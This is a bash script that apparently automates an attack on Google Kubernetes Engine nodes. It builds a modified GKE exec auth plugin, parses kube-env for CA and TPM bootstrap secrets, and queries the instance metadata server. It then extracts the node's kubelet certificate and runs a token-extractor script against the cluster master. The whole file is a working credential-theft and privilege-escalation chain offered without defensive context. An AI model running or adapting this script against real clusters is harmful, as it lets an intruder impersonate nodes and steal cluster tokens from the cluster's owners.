#!/bin/bash


# dont show any interactive screen
export DEBIAN_FRONTEND=noninteractive

# install dependencies
apt install -y golang python3 python3-requests curl


# clone the cloud provider repo and checkout to tag where the exec plugin is there
git clone https://github.com/kubernetes/cloud-provider-gcp 
cd cloud-provider-gcp
git checkout release-1.29


# build the exec auth plugin by doing the modification
cp -r ../gke-exec-auth-plugin/* cmd/gke-exec-auth-plugin
cd cmd/gke-exec-auth-plugin
go build

cp gke-exec-auth-plugin ../../../gke-cred-from-kube-env
cd ../../../

# modify kube-env to get the formatted kube-env file
cat kube-env | grep 'CA_CERT\|KUBERNETES_MASTER_NAME\|TPM_BOOTSTRAP_\|CA_FILE' | sed 's/readonly //' | sed 's/NAME=/NAME: /' | sed 's/CERT=/CERT: /' | sed 's/KEY=/KEY: /' > kube-env_new
echo 'CA_FILE_PATH: ./ca.crt' >> ./kube-env_new

# generate ca.crt
cat kube-env_new | grep "CA_CERT" | cut -d ' ' -f 2 | base64 -d > ca.crt

# get hostname
hostname=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/hostname | cut -d '.' -f 1)

# extract kubelet certificate
./gke-cred-from-kube-env $hostname

K8_SRV=$(cat kube-env_new | grep -i master | cut -d ' ' -f 2)

python3 token-extractor-gcp.py https://$K8_SRV

